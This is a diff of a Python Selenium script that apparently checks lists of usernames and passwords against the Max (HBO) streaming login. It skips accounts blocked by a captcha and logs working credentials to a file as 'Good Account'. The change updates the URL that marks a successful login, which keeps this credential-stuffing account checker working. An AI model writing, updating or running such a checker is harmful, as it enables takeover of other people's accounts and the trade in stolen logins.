@@ -52,7 +52,7 @@ def hbo():
                 if browser.find_elements(By.XPATH, '//*[@id="FunCaptcha"]'):
                     print(' | {}:{} ---> Arkose Captcha - skipped'.format(users[index], passwords[index]))
 
-                if 'https://auth.max.com/profile-picker?flow=login' in browser.current_url:
+                if 'https://play.max.com/profile-picker' in browser.current_url:
                     print(' | {}:{} ---> Success!'.format(users[index], passwords[index]))
                     account_results.write('{}:{} ---> Good Account\n'.format(users[index], passwords[index]))
 
